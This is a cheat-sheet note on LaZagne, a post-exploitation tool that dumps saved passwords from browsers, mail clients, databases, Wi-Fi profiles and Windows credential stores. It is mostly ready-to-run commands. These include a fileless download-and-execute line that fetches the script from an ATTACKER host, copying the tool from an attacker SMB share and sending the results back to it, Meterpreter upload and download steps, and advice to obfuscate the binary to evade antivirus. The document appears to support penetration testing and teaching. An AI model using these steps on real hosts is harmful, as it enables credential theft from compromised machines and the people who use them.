# LaZagne

**Tags:** `#lazagne` `#credentialdumping` `#pillaging` `#postexploitation` `#windows` `#linux` `#browsers` `#passwords`

Post-exploitation credential harvester — dumps saved passwords from browsers, mail clients, databases, system credential stores, Wi-Fi, git configs, and dozens of other applications. Single binary for Windows, Python script for Linux. One of the fastest ways to harvest credentials from a compromised host post-foothold.

**Source:** https://github.com/AlessandroZ/LaZagne
**Install:** Download pre-built `lazagne.exe` from releases (Windows), or `python3 lazagne.py` from clone (Linux/Windows)

```bash
# Windows — run everything
lazagne.exe all

# Linux
python3 lazagne.py all
```

> [!note] **LaZagne vs browser-specific tools** — LaZagne hits everything at once (browsers + apps + system stores). For targeted browser-only extraction, Firefox Decrypt or SharpChrome give more control. Use LaZagne for a quick broad sweep immediately post-foothold.

---

## Windows Usage

```powershell
# Dump everything
.\lazagne.exe all

# Verbose output (show what's being checked)
.\lazagne.exe all -v

# Write output to file
.\lazagne.exe all -oN results.txt         # plaintext
.\lazagne.exe all -oJ results.json        # JSON
.\lazagne.exe all -oA                     # all formats

# Specific category only
.\lazagne.exe browsers
.\lazagne.exe windows
.\lazagne.exe mail
.\lazagne.exe databases
.\lazagne.exe git
.\lazagne.exe wifi

# Specific application
.\lazagne.exe browsers -firefox
.\lazagne.exe browsers -chrome
.\lazagne.exe browsers -edge
.\lazagne.exe windows -credman    # Windows Credential Manager
.\lazagne.exe windows -vault      # Windows Vault

# Run without writing to disk — output only to console
.\lazagne.exe all -vv
```

---

## Linux Usage

```bash
# Run everything
python3 lazagne.py all

# Sudo for system-wide credential access
sudo python3 lazagne.py all

# Specific categories
python3 lazagne.py browsers
python3 lazagne.py databases
python3 lazagne.py git
python3 lazagne.py wifi
python3 lazagne.py mail
python3 lazagne.py sysadmin    # SSH keys, Filezilla, etc.

# Output to file
python3 lazagne.py all -oJ results.json
python3 lazagne.py all -oN results.txt
```

---

## What LaZagne Targets

### Browsers
| Browser | Windows | Linux |
|---|---|---|
| Chrome / Chromium | Yes | Yes |
| Firefox | Yes | Yes |
| Edge | Yes | — |
| IE | Yes | — |
| Opera | Yes | Yes |
| Brave | Yes | Yes |

### Windows-Specific
- **Windows Credential Manager** (`credman`) — stored domain creds, RDP passwords
- **Windows Vault** — cached credentials
- **LSA Secrets** — service account passwords (requires SYSTEM)
- **DPAPI** — protected secrets (keys, certificates)
- **Wifi** — saved Wi-Fi PSKs from all profiles

### Applications
- **Git** — `.gitconfig` credentials, stored tokens
- **FileZilla** — saved FTP/SFTP passwords
- **WinSCP** — saved SSH session passwords
- **PuTTY** — private key passphrases
- **mRemoteNG** — stored connection passwords
- **RDPManager** — RDP credentials

### Databases
- **SQLite** local databases
- **MySQL** — `.my.cnf` stored credentials
- **PostgreSQL** — `.pgpass` file

### Mail Clients
- Outlook, Thunderbird, Windows Live Mail

---

## Transferring and Running Without Dropping to Disk

```powershell
# Download and run in memory (no file write)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/lazagne.py')

# Or copy binary via SMB server and run
copy \\ATTACKER\share\lazagne.exe C:\Windows\Temp\lz.exe
C:\Windows\Temp\lz.exe all -oJ C:\Windows\Temp\out.json

# Exfil results back
copy C:\Windows\Temp\out.json \\ATTACKER\share\results.json
```

```bash
# From Meterpreter
upload lazagne.exe C:\\Windows\\Temp\\lazagne.exe
execute -f C:\\Windows\\Temp\\lazagne.exe -a "all -oN C:\\Windows\\Temp\\creds.txt" -i -H
download C:\\Windows\\Temp\\creds.txt ./creds.txt
```

---

## Parsing JSON Output

```bash
# Pretty print
cat results.json | python3 -m json.tool

# Extract all passwords
cat results.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for category in data:
    if isinstance(data[category], list):
        for entry in data[category]:
            if isinstance(entry, dict):
                pw = entry.get('Password') or entry.get('password')
                user = entry.get('Login') or entry.get('username') or entry.get('user')
                url = entry.get('URL') or entry.get('url') or entry.get('host', '')
                if pw:
                    print(f'{user}:{pw}  [{url}]')
"
```

---

## OPSEC Notes

- LaZagne reads from disk/registry — no process injection, lower AV risk than Mimikatz
- AV will flag the pre-built binary — consider compiling from source or obfuscating
- The Python script is less likely to be flagged than the compiled exe
- Running with SYSTEM/admin rights captures significantly more (LSA secrets, DPAPI, all user profiles)

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
